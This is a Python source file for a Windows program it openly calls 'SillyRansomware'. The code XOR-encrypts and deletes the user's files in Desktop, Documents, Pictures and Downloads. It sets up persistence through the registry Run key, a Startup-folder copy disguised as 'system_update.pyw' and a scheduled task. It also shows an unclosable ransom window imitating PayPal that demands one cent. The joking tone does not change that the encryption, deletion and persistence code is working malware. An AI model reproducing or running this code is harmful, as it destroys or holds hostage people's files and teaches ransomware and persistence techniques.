#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import random
from pathlib import Path
import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime
import winsound
import ctypes
import subprocess
import shutil
import pygame  # For wav playback

# For persistence (Windows only)
try:
    import winreg
except ImportError:
    pass

class SillyRansomware:
    def __init__(self):
        self.is_decrypted = False
        self.music_thread = None
        self.music_running = True
        self.encryption_key = b"SILLY_PAYPAL_2026"
        self.user_profile = str(Path.home())
        self.target_dirs = [
            os.path.join(self.user_profile, "Desktop"),
            os.path.join(self.user_profile, "Documents"),
            os.path.join(self.user_profile, "Pictures"),
            os.path.join(self.user_profile, "Downloads")
        ]
        self.encrypted_marker = os.path.join(self.user_profile, "Desktop", ".SILLY_PAYPAL_ENCRYPTED")
    
    def play_annoying_music(self):
        """Play infinite wav file loop using pygame"""
        pygame.mixer.init()
        
        # Look for wav file in multiple locations
        possible_paths = [
            os.path.join(os.path.dirname(__file__), "prettysong.wav"),
            os.path.join(os.environ['TEMP'], "prettysong.wav"),
            os.path.join(os.path.expanduser("~"), "Desktop", "prettysong.wav"),
            "prettysong.wav"
        ]
        
        wav_path = None
        for path in possible_paths:
            if os.path.exists(path):
                wav_path = path
                print(f"Found wav file: {wav_path}")
                break
        
        if not wav_path:
            print("No wav file found! Create 'prettysong.wav' in the same folder")
            print("Tip: Download any wav file or convert an mp3 online")
            self.play_fallback_beeps()
            return
        
        while self.music_running:
            try:
                pygame.mixer.music.load(wav_path)
                pygame.mixer.music.play(-1)  # -1 = infinite loop
                
                # Wait while playing
                while pygame.mixer.music.get_busy() and self.music_running:
                    time.sleep(1)
                    
            except Exception as e:
                print(f"Music error: {e}")
                self.play_fallback_beeps()
                break
    
    def play_fallback_beeps(self):
        """Fallback beeps if wav file not found"""
        print("Playing fallback beeps...")
        while self.music_running:
            try:
                winsound.Beep(440, 500)
                time.sleep(0.5)
                winsound.Beep(880, 500)
                time.sleep(0.5)
            except:
                pass
    
    def start_music(self):
        """Start music in background thread"""
        self.music_running = True
        self.music_thread = threading.Thread(target=self.play_annoying_music, daemon=True)
        self.music_thread.start()
    
    def stop_music(self):
        """Stop the annoying music"""
        self.music_running = False
        if self.music_thread:
            self.music_thread.join(timeout=2)
        try:
            pygame.mixer.music.stop()
            pygame.mixer.quit()
        except:
            pass
    
    def encrypt_file(self, filepath):
        """Silly XOR encryption"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = bytearray()
            for i, byte in enumerate(data):
                encrypted.append(byte ^ self.encryption_key[i % len(self.encryption_key)])
            
            new_path = filepath + ".silly_encrypted"
            with open(new_path, 'wb') as f:
                f.write(encrypted)
            
            os.remove(filepath)
            return True
        except Exception as e:
            return False
    
    def decrypt_file(self, filepath):
        """Decrypt silly XOR encryption"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            decrypted = bytearray()
            for i, byte in enumerate(data):
                decrypted.append(byte ^ self.encryption_key[i % len(self.encryption_key)])
            
            original_path = filepath.replace(".silly_encrypted", "")
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            os.remove(filepath)
            return True
        except Exception as e:
            return False
    
    def encrypt_all_files(self):
        """Encrypt all user files"""
        encrypted_count = 0
        
        for target_dir in self.target_dirs:
            if not os.path.exists(target_dir):
                continue
            
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    if file.endswith('.silly_encrypted') or file.endswith('.exe') or file.endswith('.dll'):
                        continue
                    
                    filepath = os.path.join(root, file)
                    if self.encrypt_file(filepath):
                        encrypted_count += 1
                    
                    if encrypted_count % 10 == 0:
                        time.sleep(0.01)
        
        with open(self.encrypted_marker, 'w') as f:
            f.write(f"Encrypted on: {datetime.now()}\nFiles: {encrypted_count}")
        
        return encrypted_count
    
    def decrypt_all_files(self):
        """Decrypt all files"""
        decrypted_count = 0
        
        for target_dir in self.target_dirs:
            if not os.path.exists(target_dir):
                continue
            
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    if file.endswith('.silly_encrypted'):
                        filepath = os.path.join(root, file)
                        if self.decrypt_file(filepath):
                            decrypted_count += 1
        
        if os.path.exists(self.encrypted_marker):
            os.remove(self.encrypted_marker)
        
        return decrypted_count
    
    def setup_persistence(self):
        """Make ransomware start on boot"""
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "SillyRansomware", 0, winreg.REG_SZ, exe_path)
            
            startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_script = os.path.join(startup, "system_update.pyw")
            shutil.copy2(exe_path, startup_script)
            
            subprocess.run([
                'schtasks', '/create', '/tn', 'SillyRansomware',
                '/tr', exe_path, '/sc', 'onlogon', '/f'
            ], capture_output=True)
            
        except Exception as e:
            print(f"Persistence error: {e}")
    
    def remove_persistence(self):
        """Clean up persistence"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.DeleteValue(reg_key, "SillyRansomware")
            
            startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_script = os.path.join(startup, "system_update.pyw")
            if os.path.exists(startup_script):
                os.remove(startup_script)
            
            subprocess.run(['schtasks', '/delete', '/tn', 'SillyRansomware', '/f'], capture_output=True)
            
        except Exception as e:
            print(f"Cleanup error: {e}")
    
    def show_ransom_window(self):
        """Display the fake PayPal ransom window"""
        
        def verify_payment():
            if messagebox.askyesno("shit verificaton", 
                                   "did you send 1 cent\n\n"
                                   "click yes to decrypt\n"
                                   "click no to keep the encrypted files"):
                self.is_decrypted = True
                root.quit()
                root.destroy()
            else:
                messagebox.showwarning("sneaky bastard tried getting away with no payment", 
                                      "no cent? no decryption\n\n"
                                      "enjoy the music olalaaaalalalalaaaaaa")
                threading.Thread(target=self.show_ransom_window, daemon=True).start()
        
        def on_closing():
            messagebox.showwarning("this window is locked", 
                                  "you cannot close this window\n\n"
                                  "pay the ransom")
            threading.Thread(target=self.show_ransom_window, daemon=True).start()
        
        root = tk.Tk()
        root.title("whoops! sillyware has encrypted your files")
        root.geometry("650x550")
        root.configure(bg='#2c3e50')
        root.attributes('-topmost', True)
        root.protocol("WM_DELETE_WINDOW", on_closing)
        
        title_frame = tk.Frame(root, bg='#c0392b')
        title_frame.pack(fill='x')
        
        title_label = tk.Label(title_frame, 
                               text="your files have been encrypted!\n"
                                    "pay 1 cent to restore them",
                               font=('Comic Sans MS', 14, 'bold'),
                               fg='yellow', bg='#c0392b', pady=20)
        title_label.pack()
        
        content_frame = tk.Frame(root, bg='#34495e', padx=20, pady=20)
        content_frame.pack(fill='both', expand=True)
        
        paypal_frame = tk.Frame(content_frame, bg='white', relief='solid', borderwidth=2)
        paypal_frame.pack(fill='both', expand=True, pady=10)
        
        paypal_label = tk.Label(paypal_frame, 
                                text="PayPal - The safer, easier way to pay online",
                                font=('Arial', 24, 'bold'),
                                fg='#0070ba', bg='white')
        paypal_label.pack(pady=10)
        
        warning_label = tk.Label(paypal_frame,
                                 text="urgent: files have been encrypted by sillyware\n"
                                      "send 1 cent to paypal to get the decryption thingy",
                                 font=('Arial', 12, 'bold'),
                                 fg='white', bg='#e74c3c',
                                 padx=20, pady=10)
        warning_label.pack(pady=10)
        
        email_label = tk.Label(paypal_frame,
                               text="send payment to:\n"
                                    "silly-ransomware@paypal-fake.com",
                               font=('Courier', 12),
                               fg='#2c3e50', bg='#ecf0f1',
                               padx=20, pady=10)
        email_label.pack(pady=10)
        
        amount_label = tk.Label(paypal_frame,
                                text="$0.01 USD",
                                font=('Arial', 48, 'bold'),
                                fg='#27ae60', bg='white')
        amount_label.pack(pady=10)
        
        time_left = 300
        timer_label = tk.Label(content_frame,
                              text=f"OFFER EXPIRES IN: {time_left//60:02d}:{time_left%60:02d} ",
                              font=('Consolas', 14, 'bold'),
                              fg='red', bg='black',
                              padx=20, pady=10)
        timer_label.pack(pady=10)
        
        def update_timer():
            nonlocal time_left
            if time_left > 0 and not self.is_decrypted:
                time_left -= 1
                timer_label.config(text=f" OFFER EXPIRES IN: {time_left//60:02d}:{time_left%60:02d}")
                if time_left < 60:
                    timer_label.config(fg='yellow')
                root.after(1000, update_timer)
            elif time_left <= 0 and not self.is_decrypted:
                timer_label.config(text="went from 1 cent to 2 cents now you better pay up!", fg='red')
                time_left = 300
                root.after(1000, update_timer)
        
        update_timer()
        
        verify_btn = tk.Button(content_frame,
                              text="if you paid 1 cent, go ahead and click this button to verify",
                              font=('Comic Sans MS', 12, 'bold'),
                              bg='#2ecc71', fg='black',
                              padx=20, pady=10,
                              command=verify_payment)
        verify_btn.pack(pady=10)
        
        root.update_idletasks()
        x = (root.winfo_screenwidth() // 2) - (root.winfo_width() // 2)
        y = (root.winfo_screenheight() // 2) - (root.winfo_height() // 2)
        root.geometry(f'+{x}+{y}')
        
        root.mainloop()
    
    def run(self):
        """Main execution"""
        print("sillyware")
        
        if not os.path.exists(self.encrypted_marker):
            print("file encryption")
            count = self.encrypt_all_files()
            print(f"encrypted {count} files!")
            print("boot persistence")
            self.setup_persistence()
        
        print("music time!")
        self.start_music()
        
        print("opening paypal")
        self.show_ransom_window()
        
        while not self.is_decrypted:
            time.sleep(0.5)
        
        print("decrypting files...")
        count = self.decrypt_all_files()
        print(f"decrypted {count} files!")
        
        print("buh bye music")
        self.stop_music()
        
        print("buh bye persistence")
        self.remove_persistence()
        
        messagebox.showinfo("decryption successful",
                           "thanks for the cent buddy\n\n"
                           "welcome your files\n"
                           "music has stopped i think\n\n"
                           "congrats buddy")
        
        print("all done")
        time.sleep(2)

if __name__ == "__main__":
    if os.name != 'nt':
        print("this is only for windows, sorry")
        sys.exit(1)
    
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False
    
    if not is_admin:
        print("yo run this with admin privileges")
    
    ransomware = SillyRansomware()
    
    try:
        ransomware.run()
    except Exception as e:
        print(f"Error: {e}")
        messagebox.showerror("Error", f"Something went wrong: {e}")